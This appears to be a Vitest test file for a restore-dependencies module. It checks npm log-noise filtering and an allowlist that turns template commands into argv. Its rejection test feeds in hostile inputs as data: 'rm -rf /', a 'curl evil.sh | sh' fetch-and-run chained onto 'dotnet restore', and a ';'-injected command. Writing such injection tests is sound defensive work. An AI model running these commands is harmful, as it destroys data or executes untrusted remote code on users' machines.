import { describe, it, expect } from "vitest";
import { resolveExecArgv, filterRestoreNoise } from "./restoreDependencies";

describe("filterRestoreNoise (user-facing log hygiene)", () => {
  it("strips npm funding/audit noise but keeps real content", () => {
    const raw = ["added 214 packages in 6s", "", "37 packages are looking for funding", "  run `npm fund` for details", "found 0 vulnerabilities", "up to date"].join("\n");
    expect(filterRestoreNoise(raw)).toBe("added 214 packages in 6s\nup to date");
  });

  it("drops npm warn/notice/deprecated lines", () => {
    const raw = "npm warn deprecated foo@1.0.0: use bar\nnpm notice New version available\nBuild succeeded";
    expect(filterRestoreNoise(raw)).toBe("Build succeeded");
  });

  it("returns empty string when a chunk is all noise or blank", () => {
    expect(filterRestoreNoise("\n\n  \n")).toBe("");
    expect(filterRestoreNoise("12 packages are looking for funding")).toBe("");
  });

  it("keeps genuine error lines intact", () => {
    const raw = "npm error code ERESOLVE\nError: could not resolve dependency";
    expect(filterRestoreNoise(raw)).toBe(raw);
  });
});

describe("resolveExecArgv (restore command allowlist)", () => {
  it("resolves known template commands to argv from the constant allowlist", () => {
    expect(resolveExecArgv("dotnet restore")).toEqual(["dotnet", "restore"]);
    expect(resolveExecArgv("pac plugin init --skip-signing")).toEqual(["pac", "plugin", "init", "--skip-signing"]);
    expect(resolveExecArgv("npm install --loglevel=error")).toEqual(["npm", "install", "--loglevel=error"]);
    // typescript is pinned to v5 so it doesn't resolve to v7 and break the @typescript-eslint peer.
    expect(resolveExecArgv("npm install typescript@^5 --loglevel=error")).toEqual(["npm", "install", "typescript@^5", "--loglevel=error"]);
    expect(resolveExecArgv("npm install typescript --loglevel=error")).toBeUndefined();
    // paket is pinned to 9.0.2 (latest 10.x is broken on the .NET 8 SDK); the allowlist
    // must match the pinned command in templates/<type>/template.json exactly.
    expect(resolveExecArgv("dotnet tool install paket --version 9.0.2")).toEqual(["dotnet", "tool", "install", "paket", "--version", "9.0.2"]);
    expect(resolveExecArgv("dotnet tool install paket")).toBeUndefined();
  });

  it("passes through argv arrays (the interpolated plugin-v3 rewrites)", () => {
    const argv = ["dotnet", "add", "C:/proj/My Plugin.csproj", "package", "Microsoft.CrmSdk.Workflow"];
    expect(resolveExecArgv(argv)).toEqual(argv);
  });

  it("refuses unrecognised or injected commands", () => {
    expect(resolveExecArgv("rm -rf /")).toBeUndefined();
    expect(resolveExecArgv("dotnet restore && curl evil.sh | sh")).toBeUndefined();
    expect(resolveExecArgv("dotnet restore; echo hacked")).toBeUndefined();
    expect(resolveExecArgv("")).toBeUndefined();
    expect(resolveExecArgv([])).toBeUndefined();
  });
});
